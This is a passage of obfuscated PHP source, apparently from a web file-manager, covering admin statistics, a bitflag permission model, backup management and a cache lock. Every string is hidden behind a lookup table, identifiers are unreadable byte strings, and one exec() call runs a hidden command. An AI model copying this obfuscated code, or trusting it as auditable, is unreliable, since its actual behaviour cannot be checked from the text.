$_SERVER[èÍ×öˆøÉ][1707] . ucfirst($ÔÎóªÓ); return $this->{$ì„È²Ò¶}(); } private function optionUser() { $›ë©õ„¾¶Ô =& $_SERVER[èÍ×öˆøÉ]; $ì©‰ëÛæãäĞ = Model($›ë©õ„¾¶Ô[532])->count($›ë©õ„¾¶Ô[1582]); $Ò¡‚ïË®ú = Model($›ë©õ„¾¶Ô[532])->where($›ë©õ„¾¶Ô[1708])->count($›ë©õ„¾¶Ô[1582]); $Ğ¨©Ú = intval($GLOBALS[$›ë©õ„¾¶Ô[6]][$›ë©õ„¾¶Ô[347]][$›ë©õ„¾¶Ô[1541]]) / 3600; $ ÈÛÒ½¢ = strtotime("\55{$Ğ¨©Ú}\40\150\x6f\165\x72\163"); $¬¡¢„±½ = strtotime(date($›ë©õ„¾¶Ô[1689])); if ($ ÈÛÒ½¢ < $¬¡¢„±½) { $ ÈÛÒ½¢ = $¬¡¢„±½; } $¸ = array($›ë©õ„¾¶Ô[1709] => array($›ë©õ„¾¶Ô[1011], $ ÈÛÒ½¢)); $Éõ€è•´Ñà² = (int) Model($›ë©õ„¾¶Ô[532])->where($¸)->count($›ë©õ„¾¶Ô[1582]); if (!$Éõ€è•´Ñà²) { $Éõ€è•´Ñà² = 1; } $¸ = array($›ë©õ„¾¶Ô[1709] => array($›ë©õ„¾¶Ô[1011], $¬¡¢„±½)); $ËÓ€„ = Model($›ë©õ„¾¶Ô[532])->where($¸)->count($›ë©õ„¾¶Ô[1582]); return array($›ë©õ„¾¶Ô[754] => (int) $ì©‰ëÛæãäĞ, $›ë©õ„¾¶Ô[1710] => (int) ($ì©‰ëÛæãäĞ - $Ò¡‚ïË®ú), $›ë©õ„¾¶Ô[1711] => (int) $Ò¡‚ïË®ú, $›ë©õ„¾¶Ô[1712] => (int) $ËÓ€„, $›ë©õ„¾¶Ô[1713] => $Éõ€è•´Ñà²); } private function optionFile() { $ÊÅ–˜ïÂ° =& $_SERVER[èÍ×öˆøÉ]; $ÇØ•„”›ÙŸ• = $this->sourceSize(); $£ª´Åâ°úó‘ = $ÇØ•„”›ÙŸ•[$ÊÅ–˜ïÂ°[78]]; $‰‹¸´ = $ÇØ•„”›ÙŸ•[$ÊÅ–˜ïÂ°[1682]]; $´ğŸ¸ = Model($ÊÅ–˜ïÂ°[827])->where(array($ÊÅ–˜ïÂ°[405] => 0))->count($ÊÅ–˜ïÂ°[397]); $áçõ’®ó‹¾š = array($ÊÅ–˜ïÂ°[405] => 0, $ÊÅ–˜ïÂ°[194] => array($ÊÅ–˜ïÂ°[1011], strtotime(date($ÊÅ–˜ïÂ°[1689])))); $êÖ¿Á÷¦°Şø = Model($ÊÅ–˜ïÂ°[827])->where($áçõ’®ó‹¾š)->sum($ÊÅ–˜ïÂ°[78]); $ªªç÷‹Î = Model($ÊÅ–˜ïÂ°[827])->where($áçõ’®ó‹¾š)->count($ÊÅ–˜ïÂ°[397]); return array($ÊÅ–˜ïÂ°[758] => $£ª´Åâ°úó‘, $ÊÅ–˜ïÂ°[1682] => $‰‹¸´, $ÊÅ–˜ïÂ°[1714] => $£ª´Åâ°úó‘ - $‰‹¸´, $ÊÅ–˜ïÂ°[1715] => (int) $êÖ¿Á÷¦°Şø, $ÊÅ–˜ïÂ°[760] => (int) $´ğŸ¸, $ÊÅ–˜ïÂ°[1716] => (int) $ªªç÷‹Î); } private function optionAccess() { $ø† =& $_SERVER[èÍ×öˆøÉ]; return array($ø†[754] => $this->typeLogCnt(), $ø†[107] => $this->typeLogCnt($ø†[107]), $ø†[444] => $this->typeLogCnt($ø†[444]), $ø†[1717] => $this->typeLogCnt($ø†[1717]), $ø†[1718] => $this->typeLogCnt($ø†[1718]), $ø†[588] => $this->typeLogCnt($ø†[33], $ø†[1693])); } private function typeLogCnt($ÇÀ„¾‘şÏê = '', $ÈËµª±À–° = "\x69\x64") { $²Şšê =& $_SERVER[èÍ×öˆøÉ]; $Ä¼—ĞÏ = array($²Şšê[107] => array($²Şšê[1719], $²Şšê[1720]), $²Şšê[444] => array($²Şšê[1721], $²Şšê[1722]), $²Şšê[1717] => array($²Şšê[1723], $²Şšê[1724], $²Şšê[1725]), $²Şšê[1718] => array($²Şšê[1726], $²Şšê[1727]), $²Şšê[1728] => array($²Şšê[1729], $²Şšê[1730], $²Şšê[1731])); $êø”¥¦æ‡Ï´› = strtotime(date($²Şšê[1689])); $€˜Ğ€› = array($²Şšê[194] => array($²Şšê[1011], $êø”¥¦æ‡Ï´›)); if ($ÇÀ„¾‘şÏê) { $€˜Ğ€›[$²Şšê[29]] = array($²Şšê[7], $Ä¼—ĞÏ[$ÇÀ„¾‘şÏê]); } $Åâ• = Model($²Şšê[1692])->where($€˜Ğ€›)->count($ÈËµª±À–°); return (int) $Åâ•; } private function optionServer() { $ºòÀÉ =& $_SERVER[èÍ×öˆøÉ]; $£²åŒå§ÙÄ‚¨ = $this->diskDriver(); $²ş™•…ÏŸ¦— = KodIO::defaultDriver(); $í«‰Ò = array($ºòÀÉ[819] => $²ş™•…ÏŸ¦—[$ºòÀÉ[395]]); $ñª’Š«¦¯ = Model($ºòÀÉ[464])->where($í«‰Ò)->sum($ºòÀÉ[78]); $àËã = explode($ºòÀÉ[50], $_SERVER[$ºòÀÉ[142]]); $’®¯ = $àËã[0]; $œá†°˜ô¼ = $GLOBALS[$ºòÀÉ[6]][$ºòÀÉ[17]]; $ôÒäå = $œá†°˜ô¼[$ºòÀÉ[972]]; if ($ôÒäå == $ºòÀÉ[792]) { $â•Âò øÃÇı = explode($ºòÀÉ[1205], $œá†°˜ô¼[$ºòÀÉ[971]]); $ôÒäå = $â•Âò øÃÇı[0]; } if ($ôÒäå == $ºòÀÉ[795] || $ôÒäå == $ºòÀÉ[796]) { $ÙÚ = Model()->db()->query($ºòÀÉ[1732]); $©³õöÉ« = $ÙÚ[0] && isset($ÙÚ[0][$ºòÀÉ[1484]]) ? $ÙÚ[0][$ºòÀÉ[1484]] : 0; $ôÒäå = $ºòÀÉ[1733] . ($©³õöÉ« ? $ºòÀÉ[8] . $©³õöÉ« : $ºòÀÉ[33]); } $‹³Î“á»è†­á = $GLOBALS[$ºòÀÉ[6]][$ºòÀÉ[347]][$ºòÀÉ[829]]; return array($ºòÀÉ[1734] => $£²åŒå§ÙÄ‚¨ ? $£²åŒå§ÙÄ‚¨[$ºòÀÉ[1735]] : 0, $ºòÀÉ[1736] => $£²åŒå§ÙÄ‚¨ ? $£²åŒå§ÙÄ‚¨[$ºòÀÉ[1737]] : 0, $ºòÀÉ[1738] => (int) $²ş™•…ÏŸ¦—[$ºòÀÉ[1735]] * 1024 * 1024 * 1024, $ºòÀÉ[1739] => (int) $ñª’Š«¦¯, $ºòÀÉ[1740] => ucfirst($’®¯), $ºòÀÉ[1741] => $ºòÀÉ[1742] . PHP_VERSION, $ºòÀÉ[1743] => phpBuild64() ? 64 : 32, $ºòÀÉ[753] => str_replace($ºòÀÉ[1744], $ºòÀÉ[988], $ôÒäå), $ºòÀÉ[347] => ucfirst($‹³Î“á»è†­á), $ºòÀÉ[28] => $_SERVER[$ºòÀÉ[1745]]); } private function diskDriver() { $Ä =& $_SERVER[èÍ×öˆøÉ]; $ Ğé = $Ä[8]; $Ç‡å·Õ·â = $GLOBALS[$Ä[6]][$Ä[1221]] == $Ä[1222]; if ($Ç‡å·Õ·â) { $ Ğé = $Ä[1746]; if (function_exists($Ä[1747])) { exec($Ä[1748], $üñ¶·Ç»×™); $ Ğé = $üñ¶·Ç»×™[1] . $Ä[8]; } } if (!file_exists($ Ğé)) { return; } $Ò“Š = @disk_total_space($ Ğé); $êâÖ¢÷Éş€Æğ = $Ò“Š - @disk_free_space($ Ğé); return array($Ä[1735] => $Ò“Š, $Ä[1737] => $êâÖ¢÷Éş€Æğ); } public function fileChart($¹™Ó¿) { $Åö¶×Å¼ =& $_SERVER[èÍ×öˆøÉ]; if (isset($¹™Ó¿[$Åö¶×Å¼[1582]])) { return Model($Åö¶×Å¼[827])->userFileTypeProfile($¹™Ó¿[$Åö¶×Å¼[1582]]); } if (isset($¹™Ó¿[$Åö¶×Å¼[1749]])) { return Model($Åö¶×Å¼[827])->groupFileTypeProfile($¹™Ó¿[$Åö¶×Å¼[1749]]); } $Áà = $this->sourceSize(); $î” = array($Åö¶×Å¼[492] => 0, $Åö¶×Å¼[406] => 1); $²¼ ‚ü½ì» = Model($Åö¶×Å¼[827])->where($î”)->sum($Åö¶×Å¼[78]); $î”[$Åö¶×Å¼[406]] = 2; $‚Ú = Model($Åö¶×Å¼[827])->where($î”)->sum($Åö¶×Å¼[78]); return array($Åö¶×Å¼[758] => $Áà[$Åö¶×Å¼[78]], $Åö¶×Å¼[1682] => $Áà[$Åö¶×Å¼[1682]], $Åö¶×Å¼[1683] => (int) $²¼ ‚ü½ì», $Åö¶×Å¼[1684] => (int) $‚Ú); } private function sourceSize() { $·È¦… =& $_SERVER[èÍ×öˆøÉ]; $†×¿¡ó«ãË = Model($·È¦…[827])->where(array($·È¦…[405] => 0))->sum($·È¦…[78]); $ğ–… = Model($·È¦…[464])->sum($·È¦…[78]); if ($ğ–… > $†×¿¡ó«ãË) { $ğ–… = $†×¿¡ó«ãË; } return array($·È¦…[78] => (int) $†×¿¡ó«ãË, $·È¦…[1682] => (int) $ğ–…); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $—ïÓ˜Ñ¼Ì¤•Ÿ =& $_SERVER[èÍ×öˆøÉ]; $ÎÑÃÍù«ğÑš— = array(array($—ïÓ˜Ñ¼Ì¤•Ÿ[415] => LNG($—ïÓ˜Ñ¼Ì¤•Ÿ[1750]), $—ïÓ˜Ñ¼Ì¤•Ÿ[1751] => $—ïÓ˜Ñ¼Ì¤•Ÿ[1752], $—ïÓ˜Ñ¼Ì¤•Ÿ[1753] => 1, $—ïÓ˜Ñ¼Ì¤•Ÿ[1754] => 1, $—ïÓ˜Ñ¼Ì¤•Ÿ[1755] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($—ïÓ˜Ñ¼Ì¤•Ÿ[415] => LNG($—ïÓ˜Ñ¼Ì¤•Ÿ[1756]), $—ïÓ˜Ñ¼Ì¤•Ÿ[1751] => $—ïÓ˜Ñ¼Ì¤•Ÿ[1757], $—ïÓ˜Ñ¼Ì¤•Ÿ[1753] => 2, $—ïÓ˜Ñ¼Ì¤•Ÿ[1754] => 1, $—ïÓ˜Ñ¼Ì¤•Ÿ[1755] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($—ïÓ˜Ñ¼Ì¤•Ÿ[415] => LNG($—ïÓ˜Ñ¼Ì¤•Ÿ[1758]), $—ïÓ˜Ñ¼Ì¤•Ÿ[1751] => $—ïÓ˜Ñ¼Ì¤•Ÿ[1759], $—ïÓ˜Ñ¼Ì¤•Ÿ[1753] => 3, $—ïÓ˜Ñ¼Ì¤•Ÿ[1754] => 1, $—ïÓ˜Ñ¼Ì¤•Ÿ[1755] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($—ïÓ˜Ñ¼Ì¤•Ÿ[415] => LNG($—ïÓ˜Ñ¼Ì¤•Ÿ[1760]), $—ïÓ˜Ñ¼Ì¤•Ÿ[1751] => $—ïÓ˜Ñ¼Ì¤•Ÿ[1761], $—ïÓ˜Ñ¼Ì¤•Ÿ[1753] => 4, $—ïÓ˜Ñ¼Ì¤•Ÿ[1754] => 1, $—ïÓ˜Ñ¼Ì¤•Ÿ[1755] => self::AUTH_SHOW | self::AUTH_VIEW), array($—ïÓ˜Ñ¼Ì¤•Ÿ[415] => LNG($—ïÓ˜Ñ¼Ì¤•Ÿ[1762]), $—ïÓ˜Ñ¼Ì¤•Ÿ[1751] => $—ïÓ˜Ñ¼Ì¤•Ÿ[1763], $—ïÓ˜Ñ¼Ì¤•Ÿ[1753] => 5, $—ïÓ˜Ñ¼Ì¤•Ÿ[1754] => 1, $—ïÓ˜Ñ¼Ì¤•Ÿ[1755] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($—ïÓ˜Ñ¼Ì¤•Ÿ[415] => LNG($—ïÓ˜Ñ¼Ì¤•Ÿ[1764]), $—ïÓ˜Ñ¼Ì¤•Ÿ[1751] => $—ïÓ˜Ñ¼Ì¤•Ÿ[1765], $—ïÓ˜Ñ¼Ì¤•Ÿ[1753] => 6, $—ïÓ˜Ñ¼Ì¤•Ÿ[1754] => 1, $—ïÓ˜Ñ¼Ì¤•Ÿ[1755] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($—ïÓ˜Ñ¼Ì¤•Ÿ[415] => LNG($—ïÓ˜Ñ¼Ì¤•Ÿ[1766]), $—ïÓ˜Ñ¼Ì¤•Ÿ[1751] => $—ïÓ˜Ñ¼Ì¤•Ÿ[1767], $—ïÓ˜Ñ¼Ì¤•Ÿ[1753] => 7, $—ïÓ˜Ñ¼Ì¤•Ÿ[1754] => 1, $—ïÓ˜Ñ¼Ì¤•Ÿ[1755] => 0)); return $ÎÑÃÍù«ğÑš—; } public static function authCheck($…ª, $Ò¨ú×) { $…ª = intval($…ª); if ($GLOBALS[$_SERVER[èÍ×öˆøÉ][499]]) { return !0; } if ($…ª <= 0) { return !1; } if (($…ª & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($…ª & $Ò¨ú×); } public static function authCheckShow($š¿Ü¡ö˜¹¥û…) { return self::authCheck($š¿Ü¡ö˜¹¥û…, self::AUTH_SHOW); } public static function authCheckView($†ƒşô) { return self::authCheck($†ƒşô, self::AUTH_VIEW); } public static function authCheckDownload($¸ÁÎÒ™¦) { return self::authCheck($¸ÁÎÒ™¦, self::AUTH_DOWNLOAD); } public static function authCheckUpload($Ê·å—…â) { return self::authCheck($Ê·å—…â, self::AUTH_UPLOAD); } public static function authCheckEdit($‹Ÿ) { return self::authCheck($‹Ÿ, self::AUTH_EDIT); } public static function authCheckRemove($ùà×) { return self::authCheck($ùà×, self::AUTH_REMOVE); } public static function authCheckShare($°‰Ê«¿) { return self::authCheck($°‰Ê«¿, self::AUTH_SHARE); } public static function authCheckComment($ùÚ¥øœË) { return self::authCheck($ùÚ¥øœË, self::AUTH_COMMENT); } public static function authCheckEvent($ïÂ—¶æÁÛì) { return self::authCheck($ïÂ—¶æÁÛì, self::AUTH_EVENT); } public static function authCheckRoot($³Ğ†¡ùöÊ¯) { return self::authCheck($³Ğ†¡ùöÊ¯, self::AUTH_ROOT); } public static function authCheckAction($Ş®, $ìºïÈá€Å©) { $ÆÔ‡¯¹ =& $_SERVER[èÍ×öˆøÉ]; $Èğ­€èé = array($ÆÔ‡¯¹[1768] => self::AUTH_VIEW, $ÆÔ‡¯¹[1132] => self::AUTH_DOWNLOAD, $ÆÔ‡¯¹[107] => self::AUTH_UPLOAD, $ÆÔ‡¯¹[1718] => self::AUTH_EDIT, $ÆÔ‡¯¹[1717] => self::AUTH_REMOVE, $ÆÔ‡¯¹[1728] => self::AUTH_SHARE, $ÆÔ‡¯¹[352] => self::AUTH_COMMENT, $ÆÔ‡¯¹[1570] => self::AUTH_EVENT, $ÆÔ‡¯¹[1769] => self::AUTH_ROOT); if (!isset($Èğ­€èé[$ìºïÈá€Å©])) { return; } $šŠ»Ì÷ì±ì­ = $Èğ­€èé[$ìºïÈá€Å©]; $Ş® = intval($Ş®); if ($Ş® <= 0) { return !1; } if (($Ş® & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($Ş® & $šŠ»Ì÷ì±ì­); } public static function authDisable($“©¹ÂÛÎ, $ÆÆ) { if (intval($“©¹ÂÛÎ) <= 0) { return 0; } return intval($“©¹ÂÛÎ) & ~$ÆÆ; } public $optionType = "\x53\x79\163\164\x65\155\56\x73\x6f\x75\x72\x63\145\x41\165\164\x68\x4c\x69\x73\x74"; public $field = array("\x6e\141\155\x65", "\x61\165\164\150", "\154\141\142\145\154", "\144\151\x73\160\154\x61\x79", "\x73\171\163\x74\x65\155", "\x73\157\x72\164"); public function initData() { $ Êõ†«Ï• = $this->authDefault(); foreach ($ Êõ†«Ï• as $²Ø) { $this->add($²Ø); } } public function findAuth($Ã„Ÿˆ¸„», $Ì·) { $ï¡¦ª²üÎ¢ =& $_SERVER[èÍ×öˆøÉ]; $ò¢ñ = parent::listData(); foreach ($ò¢ñ as $—êÒ) { $Ìå¶ = intval($—êÒ[$ï¡¦ª²üÎ¢[408]]); if ($Ìå¶ <= 0 || $—êÒ[$ï¡¦ª²üÎ¢[1770]] == 0) { continue; } if (($Ìå¶ & $Ã„Ÿˆ¸„») != $Ã„Ÿˆ¸„») { continue; } if (($Ìå¶ & $Ì·) != 0) { continue; } return $—êÒ[$ï¡¦ª²üÎ¢[395]]; } return !1; } public function findAuthReadOnly() { $úÃŞ§ˆîì = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $Œ÷Ûø› = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($úÃŞ§ˆîì, $Œ÷Ûø›); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function listData($•¯”” = false, $ÛÓ¸ = "\163\x6f\x72\164", $Ö»’•¿ = false) { return parent::listData($•¯””, $ÛÓ¸, $Ö»’•¿); } public function update($™¯÷Ü«à, $ˆ ı¬ï¯¿) { $ºí¢§Ó«” =& $_SERVER[èÍ×öˆøÉ]; $é¿æ” = parent::listData($™¯÷Ü«à); $ª¡¬úıå = $this->findByName($ˆ ı¬ï¯¿[$ºí¢§Ó«”[28]]); if (!$é¿æ” || $ª¡¬úıå && $ª¡¬úıå[$ºí¢§Ó«”[395]] != $é¿æ”[$ºí¢§Ó«”[395]]) { return !1; } $this->filterAuth($ˆ ı¬ï¯¿[$ºí¢§Ó«”[408]]); return parent::update($™¯÷Ü«à, $ˆ ı¬ï¯¿); } public function remove($ıÜÖ÷üå) { $ÁÕÍµ¿ ½ ’ = parent::listData($ıÜÖ÷üå); if (!$ÁÕÍµ¿ ½ ’ || $ÁÕÍµ¿ ½ ’[$_SERVER[èÍ×öˆøÉ][1209]]) { return !1; } return parent::remove($ıÜÖ÷üå); } public function add($‚Ìµ©¿ = array()) { $¼œÉßæ‰–ãˆ =& $_SERVER[èÍ×öˆøÉ]; if ($this->findByName($‚Ìµ©¿[$¼œÉßæ‰–ãˆ[28]])) { return !1; } $„ù¯º¡äÓÄ° = array($¼œÉßæ‰–ãˆ[28] => $¼œÉßæ‰–ãˆ[33], $¼œÉßæ‰–ãˆ[408] => 1, $¼œÉßæ‰–ãˆ[1771] => $¼œÉßæ‰–ãˆ[1759], $¼œÉßæ‰–ãˆ[1770] => 1, $¼œÉßæ‰–ãˆ[1209] => 0, $¼œÉßæ‰–ãˆ[1772] => 0); $‚Ìµ©¿ = array_merge($„ù¯º¡äÓÄ°, $‚Ìµ©¿); $‚Ìµ©¿[$¼œÉßæ‰–ãˆ[1772]] = $this->getSort(); $this->filterAuth($‚Ìµ©¿[$¼œÉßæ‰–ãˆ[408]]); return parent::insert($‚Ìµ©¿); } private function getSort() { $­ß‘«ä« =& $_SERVER[èÍ×öˆøÉ]; $šÆœ„ÍƒÜæ = parent::listData(); $¨È—¢ = array_to_keyvalue($šÆœ„ÍƒÜæ, $­ß‘«ä«[33], $­ß‘«ä«[1772]); return empty($¨È—¢) ? 0 : max($¨È—¢) + 1; } private function filterAuth(&$İúšî³) { if (!$İúšî³) { return; } $¯üºñ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $ŸšÒÏÑÏÒ = array(); foreach ($¯üºñ as $¿„àïÜ) { if ($İúšî³ & $¿„àïÜ) { $ŸšÒÏÑÏÒ[] = $¿„àïÜ; } } if (in_array(self::AUTH_ROOT, $ŸšÒÏÑÏÒ)) { $İúšî³ = array_sum($¯üºñ); return; } $œÚáø’ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($ŸšÒÏÑÏÒ as $¿„àïÜ) { if (isset($œÚáø’[$¿„àïÜ])) { $ŸšÒÏÑÏÒ = array_merge($ŸšÒÏÑÏÒ, $œÚáø’[$¿„àïÜ]); } } $ŸšÒÏÑÏÒ[] = self::AUTH_SHOW; $İúšî³ = array_sum(array_unique($ŸšÒÏÑÏÒ)); } public function sort($ûüá, $ƒíÔªÄÏ„) { return parent::update($ûüá, $ƒíÔªÄÏ„); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\x65\x6d\x2e\x62\141\143\153\165\160\114\151\163\164"; public $field = array("\x69\x6f", "\156\x61\x6d\145", "\x73\x74\x61\164\x75\163", "\x63\157\156\164\145\x6e\164", "\x6d\x61\156\x75\141\154", "\162\145\x73\x75\154\x74", "\x74\x69\155\145\x46\162\x6f\x6d", "\x74\151\x6d\145\124\x6f"); public function config() { $˜ÅÕ«Ö± =& $_SERVER[èÍ×öˆøÉ]; $óÖå = Model($˜ÅÕ«Ö±[765])->get($˜ÅÕ«Ö±[777]); $óÖå = json_decode($óÖå, !0); $óÖå = is_array($óÖå) ? $óÖå : array(); if (!isset($óÖå[$˜ÅÕ«Ö±[750]])) { $óÖå[$˜ÅÕ«Ö±[750]] = $˜ÅÕ«Ö±[87]; } unset($óÖå[$˜ÅÕ«Ö±[1552]]); Action($˜ÅÕ«Ö±[1773])->taskInit(); Model($˜ÅÕ«Ö±[1551])->cacheClear(); $ëÏÉ¿‚ = $˜ÅÕ«Ö±[1774]; $‹âáïÃŞÚ = Model($˜ÅÕ«Ö±[1775])->findByKey($˜ÅÕ«Ö±[1570], $ëÏÉ¿‚); if (!$‹âáïÃŞÚ) { $‹âáïÃŞÚ = array(); } if (isset($‹âáïÃŞÚ[$˜ÅÕ«Ö±[197]])) { $‹âáïÃŞÚ[$˜ÅÕ«Ö±[197]] = json_decode($‹âáïÃŞÚ[$˜ÅÕ«Ö±[197]], !0); } if (isset($óÖå[$˜ÅÕ«Ö±[197]])) { $‹âáïÃŞÚ[$˜ÅÕ«Ö±[197]][$˜ÅÕ«Ö±[1555]] = $óÖå[$˜ÅÕ«Ö±[197]]; unset($óÖå[$˜ÅÕ«Ö±[197]]); } return array_merge($‹âáïÃŞÚ, $óÖå); } public function listData($ºñÀú£¿·Íƒ = false, $¡Ááº˜Ó¤ø¾’ = "\x6d\157\144\151\146\171\124\x69\155\145", $õúäº¬õÓ´‡ = false) { return parent::listData($ºñÀú£¿·Íƒ, $¡Ááº˜Ó¤ø¾’, !0); } public function lastItem() { $Ö¨³•â = $this->listData(); return !empty($Ö¨³•â[0]) ? $Ö¨³•â[0] : null; } public function kill($‹Ç á‹‚) { $÷ÁÃ„ =& $_SERVER[èÍ×öˆøÉ]; $‚ = $this->listData($‹Ç á‹‚); if (!$‚ || empty($‚[$÷ÁÃ„[28]])) { return !0; } Task::kill($÷ÁÃ„[776]); Task::kill($÷ÁÃ„[801]); Task::kill($÷ÁÃ„[811]); $˜¤°æ‘¬Ô† = $‚[$÷ÁÃ„[28]]; $šˆèÄÉÇ = TEMP_FILES . $÷ÁÃ„[773] . $˜¤°æ‘¬Ô† . $÷ÁÃ„[8]; IO::remove($šˆèÄÉÇ, !1); return $this->remove($‹Ç á‹‚); } public function remove($İÊÙ¬µ÷ ä) { $ŒÕ¬ëòˆ” = $this->listData($İÊÙ¬µ÷ ä); if (!$ŒÕ¬ëòˆ”) { return !0; } return $this->backupRemove($ŒÕ¬ëòˆ”); } private function backupRemove($·‹¿) { parent::remove($·‹¿[$_SERVER[èÍ×öˆøÉ][395]]); $Œ›‰ = $this->backupPath($·‹¿); IO::remove($Œ›‰, !1); return !0; } private function backupPath($º…­ ­ËµÖİ) { $‡Ü³ŸÆ¡Ï‹º =& $_SERVER[èÍ×öˆøÉ]; $¹½¦ªë = $º…­ ­ËµÖİ[$‡Ü³ŸÆ¡Ï‹º[28]]; $³õİä™³äİ = Model($‡Ü³ŸÆ¡Ï‹º[765])->get($‡Ü³ŸÆ¡Ï‹º[766]); $ÍİÇÈÁ¥ÌÓ = substr(md5($‡Ü³ŸÆ¡Ï‹º[767] . $³õİä™³äİ . $¹½¦ªë), 0, 8); return "\173\x69\x6f\72{$º…­ ­ËµÖİ[$‡Ü³ŸÆ¡Ï‹º[747]]}\x7d\x2f\144\x61\164\141\142\x61\163\145\57\142\x61\x63\x6b\165\160\x2f" . $¹½¦ªë . $‡Ü³ŸÆ¡Ï‹º[71] . $ÍİÇÈÁ¥ÌÓ; } public function start() { $áõí’”ÃÌ¾ =& $_SERVER[èÍ×öˆøÉ]; if ($GLOBALS[$áõí’”ÃÌ¾[6]][$áõí’”ÃÌ¾[88]][$áõí’”ÃÌ¾[1776]] != $áõí’”ÃÌ¾[87]) { return !0; } $Ú’åÖÖ = $this->config(); if (!$Ú’åÖÖ || $Ú’åÖÖ[$áõí’”ÃÌ¾[1552]] != $áõí’”ÃÌ¾[87]) { return !1; } $ğ¾ÃŠòî³æ = $this->process(); foreach ($ğ¾ÃŠòî³æ as $à¥ äÓê… ã) { if ($à¥ äÓê… ã) { return Task::restart($à¥ äÓê… ã[$áõí’”ÃÌ¾[395]]); } } $Ùü = new Backup(); $ƒáôß÷†Óï = $Ùü->db(); if ($ƒáôß÷†Óï) { $ƒáôß÷†Óï = $Ùü->dbFile(); if ($ƒáôß÷†Óï && $Ú’åÖÖ[$áõí’”ÃÌ¾[750]] == $áõí’”ÃÌ¾[191]) { $ƒáôß÷†Óï = $Ùü->file(); } } Backup::set(array($áõí’”ÃÌ¾[745] => 1, $áõí’”ÃÌ¾[490] => time())); return !0; } public function process() { $Ç³êó =& $_SERVER[èÍ×öˆøÉ]; return array($Ç³êó[753] => Task::get($Ç³êó[776]), $Ç³êó[757] => Task::get($Ç³êó[801]), $Ç³êó[193] => Task::get($Ç³êó[811])); } public function restore() { $¶á =& $_SERVER[èÍ×öˆøÉ]; ActionCall($¶á[1057], !0, 1); ActionCall($¶á[1057], !0, 0); } } goto eÉï¿ƒÇµ; eÎö‚¹ìÕ‹: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $ïÔÔèœ =& $_SERVER[èÍ×öˆøÉ]; if (self::$handle) { return self::$handle; } $”ÙÓüŒ = $GLOBALS[$ïÔÔèœ[6]][$ïÔÔèœ[347]]; self::$timeout = $”ÙÓüŒ[$ïÔÔèœ[842]] ? $”ÙÓüŒ[$ïÔÔèœ[842]] : 10; $è™¸‹–ûÌŠ = _get($GLOBALS[$ïÔÔèœ[6]], $ïÔÔèœ[843]); $„ğò«Ã”¹±Æ¨ = $”ÙÓüŒ[$ïÔÔèœ[829]] ? $”ÙÓüŒ[$ïÔÔèœ[829]] : $ïÔÔèœ[193]; if ($„ğò«Ã”¹±Æ¨ == $ïÔÔèœ[17] && $è™¸‹–ûÌŠ == $ïÔÔèœ[9]) { $„ğò«Ã”¹±Æ¨ = $ïÔÔèœ[193]; } switch ($„ğò«Ã”¹±Æ¨) { case $ïÔÔèœ[832]: self::$handle = new CacheLockRedis(); break; case $ïÔÔèœ[833]: self::$handle = new CacheLockMemcached(); break; case $ïÔÔèœ[17]: self::$handle = new CacheLockDatabase(); break; case $ïÔÔèœ[193]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($ïÔÔèœ[844] . REQUEST_ID . $ïÔÔèœ[845], $ïÔÔèœ[846]); } return self::$handle; } private static function key($‰¦”¢ªùÒ˜¨) { return $_SERVER[èÍ×öˆøÉ][847] . Cache::key($‰¦”¢ªùÒ˜¨); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($ÚÉË = '') { self::$errorMsg = $ÚÉË; } public static function lockGlobal($¨, $ÒÉ¬çˆõ“‘âš) { return self::lock($¨, $ÒÉ¬çˆõ“‘âš, !0); } public static function lock($–Î, $Š«¾´ = false, $™£ÁÂ = false) { $¤ÏĞ¤À =& $_SERVER[èÍ×öˆøÉ]; $•ê¬ş = self::init(); $Ù­ÀÏ¬Î = self::key($–Î); $Š«¾´ = $Š«¾´ ? $Š«¾´ : self::$timeout; $ï¥¿ª¿ª— = $•ê¬ş->lock($Ù­ÀÏ¬Î, $Š«¾´); $¾Ã = timeFloat(); if 